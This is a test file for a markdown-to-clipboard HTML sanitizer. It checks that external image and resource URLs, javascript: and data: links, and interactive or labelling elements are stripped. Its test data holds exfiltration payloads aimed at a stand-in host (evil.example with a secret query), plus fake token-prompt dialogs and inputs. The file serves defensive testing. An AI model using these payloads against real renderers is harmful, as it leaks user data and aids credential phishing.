// @vitest-environment jsdom
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import {
  copyMarkdownToClipboard,
  copyToClipboard,
  markdownToClipboardHtml as toHtml,
} from '../src/clipboard';

const url = 'https://evil.example/leak.png?secret=abc';

describe('markdownToClipboardHtml', () => {
  it('renders basic markdown', () => {
    const html = toHtml('**bold** [link](https://example.com "Title")\n\n3. item');
    expect(html).toMatch(/<strong>bold<\/strong>/);
    expect(html).toMatch(/<a href="https:\/\/example.com" title="Title">link<\/a>/);
    expect(html).toMatch(/<ol start="3">/);
  });

  it('keeps table column alignment', () => {
    expect(toHtml('| a |\n|:-:|\n| 1 |')).toMatch(/<td align="center">1<\/td>/);
  });

  it('renders task list checkboxes as text', () => {
    expect(toHtml('- [x] done\n- [ ] todo')).toBe(
      '<ul>\n<li>☑ done</li>\n<li>☐ todo</li>\n</ul>\n',
    );
  });

  it('keeps harmless HTML tags', () => {
    const markdown =
      '<b>b</b> <i>i</i> <s>s</s> <u>u</u> <ins>ins</ins> <mark>mark</mark> <small>small</small>';
    expect(toHtml(markdown)).toBe(`<p>${markdown}</p>\n`);
  });

  it('keeps divs, definition lists and collapsible sections', () => {
    const markdown =
      '<div>a</div><dl><dt>Term</dt><dd>Definition</dd></dl><details open=""><summary>s</summary></details>';
    expect(toHtml(markdown)).toBe(markdown);
  });

  it('removes tags not on the allow list but keeps their text', () => {
    expect(toHtml('<span>text</span>')).toBe('<p>text</p>\n');
  });

  it('removes attributes not on the allow list', () => {
    expect(toHtml('<p popover="manual" title="Title">text</p>')).toBe('<p title="Title">text</p>');
  });

  [
    ['markdown image', `![alt](${url})`],
    ['img src', `<img src="${url}">`],
    ['picture source', `<picture><source srcset="${url}"></picture>`],
    ['video poster', `<video poster="${url}"></video>`],
    ['svg image', `<svg><image href="${url}"></image></svg>`],
    ['input image', `<input type="image" src="${url}">`],
    ['style attribute', `<span style="background:url(${url})">text</span>`],
    ['style element', `text\n\n<style>p{background:url(${url})}</style>`],
    ['table background', `<table background="${url}"><tr><td>cell</td></tr></table>`],
    ['iframe srcdoc', `<iframe srcdoc="<img src=${url}>"></iframe>`],
    ['a ping', `<a href="https://example.com" ping="${url}">link</a>`],
    ['base href', `text\n\n<base href="${url}">`],
    ['meta refresh', `text\n\n<meta http-equiv="refresh" content="0;url=${url}">`],
    ['form action', `text\n\n<form action="${url}"><button>Go</button></form>`],
  ].forEach(([name, markdown]) => {
    it(`removes external URLs (${name})`, () => {
      expect(toHtml(markdown)).not.toMatch(/evil\.example/);
    });
  });

  [
    ['javascript', '[link](javascript:alert(1))'],
    ['data', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">link</a>'],
  ].forEach(([name, markdown]) => {
    it(`removes unsafe link URLs (${name})`, () => {
      expect(toHtml(`text\n\n${markdown}`)).not.toMatch(/href/);
    });
  });

  [
    ['button', '<button>Approve</button>', /<button/],
    ['dialog', '<dialog open><p>Re-enter your token</p></dialog>', /<dialog/],
    ['input', '<input type="password" title="Re-enter your token">', /<input/],
    ['select', '<select><option>a</option></select>', /<select/],
    ['textarea', '<textarea>token</textarea>', /<textarea/],
  ].forEach(([name, markdown, pattern]) => {
    it(`removes interactive elements (${name})`, () => {
      expect(toHtml(`text\n\n${markdown}`)).not.toMatch(pattern as RegExp);
    });
  });

  [
    ['class', '<div class="pf-v6-c-backdrop">text</div>', /class=/],
    ['code block class', '```js\nfoo\n```', /class=/],
    ['data', '<div data-test="approve-button">text</div>', /data-/],
    ['aria', '<div aria-label="Approved">Denied</div>', /aria-/],
    ['role', '<div role="alertdialog">text</div>', /role=/],
    ['id', '<div id="content">text</div>', /id=/],
    ['download', '<a href="https://example.com" download="fix.sh">fix</a>', /download/],
  ].forEach(([name, markdown, pattern]) => {
    it(`removes attributes that could style, label or identify content (${name})`, () => {
      expect(toHtml(`text\n\n${markdown}`)).not.toMatch(pattern as RegExp);
    });
  });
});

class FakeClipboardItem {
  static supports = vi.fn(() => true);
  items: Record<string, Blob>;
  constructor(items: Record<string, Blob>) {
    this.items = items;
  }
}

const stubClipboard = (clipboard: Partial<Clipboard>) => {
  vi.stubGlobal('navigator', { clipboard });
};

describe('copyToClipboard', () => {
  afterEach(() => {
    vi.restoreAllMocks();
    vi.unstubAllGlobals();
  });

  it('writes the text to the clipboard', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    stubClipboard({ writeText });
    await copyToClipboard('oc get pods');
    expect(writeText).toHaveBeenCalledWith('oc get pods');
  });

  it('logs an error instead of throwing when the write fails', async () => {
    const consoleError = vi.spyOn(console, 'error').mockImplementation(() => undefined);
    stubClipboard({ writeText: vi.fn().mockRejectedValue(new Error('Denied')) });
    await expect(copyToClipboard('oc get pods')).resolves.toBeUndefined();
    expect(consoleError).toHaveBeenCalled();
  });
});

describe('copyMarkdownToClipboard', () => {
  const markdown = '**Bold** text';

  beforeEach(() => {
    FakeClipboardItem.supports.mockReturnValue(true);
    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.unstubAllGlobals();
  });

  it('writes the rendered and sanitized HTML, plus the raw markdown as plain text', async () => {
    const write = vi.fn().mockResolvedValue(undefined);
    const writeText = vi.fn();
    stubClipboard({ write, writeText });

    await copyMarkdownToClipboard(markdown);

    expect(write).toHaveBeenCalledTimes(1);
    const [item] = write.mock.calls[0][0];
    expect(item).toBeInstanceOf(FakeClipboardItem);
    const { 'text/html': html, 'text/plain': plain } = item.items;
    expect(html.type).toBe('text/html');
    expect(await html.text()).toBe('<p><strong>Bold</strong> text</p>\n');
    expect(plain.type).toBe('text/plain');
    expect(await plain.text()).toBe(markdown);
    expect(writeText).not.toHaveBeenCalled();
  });

  it('falls back to plain text when ClipboardItem is unavailable', async () => {
    vi.stubGlobal('ClipboardItem', undefined);
    const write = vi.fn();
    const writeText = vi.fn().mockResolvedValue(undefined);
    stubClipboard({ write, writeText });

    await copyMarkdownToClipboard(markdown);

    expect(write).not.toHaveBeenCalled();
    expect(writeText).toHaveBeenCalledWith(markdown);
  });

  it('falls back to plain text when ClipboardItem.supports is unavailable', async () => {
    vi.stubGlobal('ClipboardItem', class {});
    const write = vi.fn();
    const writeText = vi.fn().mockResolvedValue(undefined);
    stubClipboard({ write, writeText });

    await copyMarkdownToClipboard(markdown);

    expect(write).not.toHaveBeenCalled();
    expect(writeText).toHaveBeenCalledWith(markdown);
  });

  it('falls back to plain text when HTML is not supported', async () => {
    FakeClipboardItem.supports.mockReturnValue(false);
    const write = vi.fn();
    const writeText = vi.fn().mockResolvedValue(undefined);
    stubClipboard({ write, writeText });

    await copyMarkdownToClipboard(markdown);

    expect(write).not.toHaveBeenCalled();
    expect(writeText).toHaveBeenCalledWith(markdown);
  });

  it('falls back to plain text when clipboard.write is unavailable', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    stubClipboard({ writeText });

    await copyMarkdownToClipboard(markdown);

    expect(writeText).toHaveBeenCalledWith(markdown);
  });

  it('warns and falls back to plain text when the rich write fails', async () => {
    const consoleWarn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const writeText = vi.fn().mockResolvedValue(undefined);
    stubClipboard({ write: vi.fn().mockRejectedValue(new Error('Denied')), writeText });

    await copyMarkdownToClipboard(markdown);

    expect(consoleWarn).toHaveBeenCalled();
    expect(writeText).toHaveBeenCalledWith(markdown);
  });
});
